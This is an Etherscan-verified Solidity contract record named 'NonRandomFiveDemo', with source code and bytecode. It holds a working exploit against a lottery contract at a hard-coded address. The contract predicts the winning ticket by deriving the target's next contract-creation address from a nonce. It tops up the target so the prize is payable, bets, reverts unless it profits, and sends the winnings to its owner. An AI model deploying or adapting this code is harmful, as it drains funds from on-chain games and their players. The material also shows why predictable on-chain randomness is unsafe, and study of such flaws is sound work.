{
  "address": "0xd0a6b36fb7758cc576ddebc027ac32524f9ce2b9",
  "chain": "ETH",
  "chainID": 1,
  "verifier": "etherscan.io",
  "commonName": "",
  "contractName": "NonRandomFiveDemo",
  "compilerVersion": "v0.5.2+commit.1df8f40c",
  "optimization": true,
  "runs": "200",
  "evmVersion": "default",
  "sourceCode": "/**\n *Submitted for verification at Etherscan.io on 2019-01-11\n*/\n\npragma solidity ^0.5.0;\n\ninterface TargetInterface {\n    function sendTXTpsTX(string calldata UserTicketKey, string calldata setRef) external payable;\n}\n\ncontract NonRandomFiveDemo {\n    \n    address payable private targetAddress = 0xC19abA5148A8E8E2b813D40bE1276312FeDdB813;\n    address payable private owner;\n    \n\tmodifier onlyOwner() {\n\t\trequire(msg.sender == owner);\n\t\t_;\n\t}\n\n    constructor() public payable {\n        owner = msg.sender;\n    }\n\n    function ping(uint256 _nonce, bool _keepBalance) public payable onlyOwner {\n        uint256 ourBalanceInitial = address(this).balance;\n\n        uint256 targetBalanceInitial = targetAddress.balance;\n        uint256 betValue = targetBalanceInitial / 28;\n        uint256 betValueReduced = betValue - ((betValue / 1000) * 133);\n        uint256 targetBalanceAfterBet = targetBalanceInitial + betValueReduced;\n        uint256 expectedPrize = (betValueReduced / 100) * 3333;\n        \n        if (expectedPrize > targetBalanceAfterBet) {\n            uint256 throwIn = expectedPrize - targetBalanceAfterBet;\n            targetAddress.transfer(throwIn);\n        }\n\n        string memory betString = ticketString(_nonce);\n        TargetInterface target = TargetInterface(targetAddress);\n        target.sendTXTpsTX.value(betValue)(betString, \"\");\n        \n        require(address(this).balance > ourBalanceInitial);\n        \n        if (!_keepBalance) {\n            owner.transfer(address(this).balance);\n        }\n    }\n\n    function withdraw() public onlyOwner {\n        owner.transfer(address(this).balance);\n    }    \n    \n    function kill() public onlyOwner {\n        selfdestruct(owner);\n    }    \n    \n    function () external payable {\n    }\n\n    function ticketString(uint256 _nonce) public view returns (string memory) {\n        bytes32 ticketAddressBytes = addressBytesFrom(targetAddress, _nonce);\n        return ticketStringFromAddressBytes(ticketAddressBytes);\n    }\n    \n    function addressBytesFrom(address _origin, uint256 _nonce) private pure returns (bytes32) {\n        if (_nonce == 0x00)     return keccak256(abi.encodePacked(byte(0xd6), byte(0x94), _origin, byte(0x80)));\n        if (_nonce <= 0x7f)     return keccak256(abi.encodePacked(byte(0xd6), byte(0x94), _origin, uint8(_nonce)));\n        if (_nonce <= 0xff)     return keccak256(abi.encodePacked(byte(0xd7), byte(0x94), _origin, byte(0x81), uint8(_nonce)));\n        if (_nonce <= 0xffff)   return keccak256(abi.encodePacked(byte(0xd8), byte(0x94), _origin, byte(0x82), uint16(_nonce)));\n        if (_nonce <= 0xffffff) return keccak256(abi.encodePacked(byte(0xd9), byte(0x94), _origin, byte(0x83), uint24(_nonce)));\n        return keccak256(abi.encodePacked(byte(0xda), byte(0x94), _origin, byte(0x84), uint32(_nonce)));\n    }\n\n    function ticketStringFromAddressBytes(bytes32 _addressBytes) private pure returns(string memory) {\n        bytes memory alphabet = \"0123456789abcdef\";\n        \n        bytes memory ticketBytes = new bytes(5);\n        ticketBytes[0] = alphabet[uint8(_addressBytes[29] & 0x0f)];\n        ticketBytes[1] = alphabet[uint8(_addressBytes[30] >> 4)];\n        ticketBytes[2] = alphabet[uint8(_addressBytes[30] & 0x0f)];\n        ticketBytes[3] = alphabet[uint8(_addressBytes[31] >> 4)];\n        ticketBytes[4] = alphabet[uint8(_addressBytes[31] & 0x0f)];\n        \n        return string(ticketBytes);\n    }\n\n}",
  "bytecode": "608060405260008054600160a060020a031990811673c19aba5148a8e8e2b813d40be1276312feddb813179091556001805490911633179055610b19806100476000396000f3fe60806040526004361061005b577c0100000000000000000000000000000000000000000000000000000000600035046332e5535a811461005d5780633ccfd60b146100fc57806341c0e1b514610111578063527d8f1214610126575b005b34801561006957600080fd5b506100876004803603602081101561008057600080fd5b503561014b565b6040805160208082528351818301528351919283929083019185019080838360005b838110156100c15781810151838201526020016100a9565b50505050905090810190601f1680156100ee5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561010857600080fd5b5061005b610178565b34801561011d57600080fd5b5061005b6101cc565b61005b6004803603604081101561013c57600080fd5b508035906020013515156101f1565b600080546060919061016690600160a060020a0316846103df565b90506101718161082e565b9392505050565b600154600160a060020a0316331461018f57600080fd5b600154604051600160a060020a0390911690303180156108fc02916000818181858888f193505050501580156101c9573d6000803e3d6000fd5b50565b600154600160a060020a031633146101e357600080fd5b600154600160a060020a0316ff5b600154600160a060020a0316331461020857600080fd5b600054303190600160a060020a031631601c810460856103e88204028103808301610d05606483040281811115610279576000805460405184840392600160a060020a039092169183156108fc02918491818181858888f19350505050158015610276573d6000803e3d6000fd5b50505b60606102848961014b565b60008054604080517fb07a0d0400000000000000000000000000000000000000000000000000000000815260048101918252845160448201528451949550600160a060020a0390921693849363b07a0d04938b9388939092839260248101926064909101916020870191908190849084905b8381101561030e5781810151838201526020016102f6565b50505050905090810190601f16801561033b5780820380516001836020036101000a031916815260200191505b5083810382526000815260200160200193505050506000604051808303818588803b15801561036957600080fd5b505af115801561037d573d6000803e3d6000fd5b5050505030318910905061039057600080fd5b8815156103d357600154604051600160a060020a0390911690303180156108fc02916000818181858888f193505050501580156103d1573d6000803e3d6000fd5b505b50505050505050505050565b60008115156104845750604080517fd60000000000000000000000000000000000000000000000000000000000000060208083019190915260fa60020a60250260218301526c01000000000000000000000000600160a060020a0386160260228301527f800000000000000000000000000000000000000000000000000000000000000060368301528251601781840301815260379092019092528051910120610828565b607f82116105115750604080517fd60000000000000000000000000000000000000000000000000000000000000060208083019190915260fa60020a60250260218301526c01000000000000000000000000600160a060020a03861602602283015260ff841660f860020a0260368301528251601781840301815260379092019092528051910120610828565b60ff82116105c45750604080517fd70000000000000000000000000000000000000000000000000000000000000060208083019190915260fa60020a60250260218301526c01000000000000000000000000600160a060020a0386160260228301527f8100000000000000000000000000000000000000000000000000000000000000603683015260ff841660f860020a0260378301528251601881840301815260389092019092528051910120610828565b61ffff82116106945750604080517fd80000000000000000000000000000000000000000000000000000000000000060208083019190915260fa60020a60250260218301526c01000000000000000000000000600160a060020a0386160260228301527f820000000000000000000000000000000000000000000000000000000000000060368301527e0100000000000000000000000000000000000000000000000000000000000061ffff85160260378301528251601981840301815260399092019092528051910120610828565b62ffffff82116107655750604080517fd90000000000000000000000000000000000000000000000000000000000000060208083019190915260fa60020a60250260218301526c01000000000000000000000000600160a060020a0386160260228301527f830000000000000000000000000000000000000000000000000000000000000060368301527d01000000000000000000000000000000000000000000000000000000000062ffffff85160260378301528251601a818403018152603a9092019092528051910120610828565b50604080517fda0000000000000000000000000000000000000000000000000000000000000060208083019190915260fa60020a60250260218301526c01000000000000000000000000600160a060020a0386160260228301527f840000000000000000000000000000000000000000000000000000000000000060368301527c010000000000000000000000000000000000000000000000000000000063ffffffff85160260378301528251601b818403018152603b90920190925280519101205b92915050565b604080518082018252601081527f303132333435363738396162636465660000000000000000000000000000000060208201528151600580825281840190935260609283919060208201818038833950508351919250839160ff60f860020a7f0f00000000000000000000000000000000000000000000000000000000000000601d8a901a8202160416915081106108c257fe5b90602001015160f860020a900460f860020a028160008151811015156108e457fe5b906020010190600160f860020a031916908160001a9053508151829060ff60f860020a60107fff00000000000000000000000000000000000000000000000000000000000000601e8a901a83021604041690811061093e57fe5b90602001015160f860020a900460f860020a0281600181518110151561096057fe5b906020010190600160f860020a031916908160001a9053508151829060ff60f860020a7f0f00000000000000000000000000000000000000000000000000000000000000601e89901a82021604169081106109b757fe5b90602001015160f860020a900460f860020a028160028151811015156109d957fe5b906020010190600160f860020a031916908160001a9053508151829060ff60f860020a60107fff00000000000000000000000000000000000000000000000000000000000000601f8a901a830216040416908110610a3357fe5b90602001015160f860020a900460f860020a02816003815181101515610a5557fe5b906020010190600160f860020a031916908160001a9053508151829060ff60f860020a7f0f00000000000000000000000000000000000000000000000000000000000000601f89901a8202160416908110610aac57fe5b90602001015160f860020a900460f860020a02816004815181101515610ace57fe5b906020010190600160f860020a031916908160001a905350939250505056fea165627a7a723058208a870c629d03271ac61d707827426beed57219a256bad2d0a6b13e3c752213810029"
}